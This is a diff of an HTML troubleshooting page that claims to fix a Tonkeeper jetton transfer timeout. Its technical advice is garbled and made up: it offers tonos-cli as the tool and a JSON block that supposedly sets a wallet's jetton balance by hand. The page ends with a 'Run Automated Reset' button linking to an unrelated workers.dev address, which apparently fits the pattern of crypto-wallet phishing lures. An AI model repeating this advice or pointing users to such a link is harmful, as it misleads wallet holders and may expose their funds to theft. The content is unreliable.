@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0a0c10;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -42,30 +42,36 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and potential loss of funds.</li>
+<li>Users encounter a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an unclear status of their jetton balance.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a prolonged loop in the transfer process, often caused by network congestion, insufficient gas, or incorrect smart contract configuration.</li>
+<li>The error occurs due to a temporary mismatch between the user's wallet state and the blockchain's state, causing the transfer loop to exceed the allowable timeout threshold.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit for the transaction to ensure sufficient resources are allocated:</li>
-<li>Modify the transaction parameters to include a higher gas limit</li>
-<li>Utilize a different transfer method to bypass the loop</li>
-<li>Run the following command to override the default gas limit:</li>
+<li>To resolve the issue, users can attempt the following manual overrides:</li>
+<li>Increase the timeout threshold using the <code>tonos-cli</code> command</li>
+<li>Restart the Tonkeeper wallet application to resynchronize with the blockchain</li>
+<li>Utilize the following code block to manually update the wallet's state:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;contract_address&gt;<span class="w"> </span>transferJetton<span class="w"> </span><span class="s1">&#39;{&quot;dst&quot;:&quot;&lt;destination_address&gt;&quot;,&quot;amount&quot;:&lt;amount&gt;,&quot;gas&quot;:1000000}&#39;</span><span class="w"> </span>--abi<span class="w"> </span>&lt;abi_file&gt;
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;update&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;wallet_address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_wallet_address&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;jetton_balance&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;updated_jetton_balance&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration options. </p>
+<p>Consider utilizing an external console for more complex troubleshooting scenarios. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Familiarity with TON blockchain and Tonkeeper wallet</li>
-<li>Basic understanding of smart contract functionality and gas management</li>
-<li>Access to the Tonos-CLI tool for manual transaction overrides</li>
+<li>Familiarity with the TON blockchain and its ecosystem</li>
+<li>Access to the <code>tonos-cli</code> command-line tool</li>
+<li>A basic understanding of JSON formatting and syntax</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
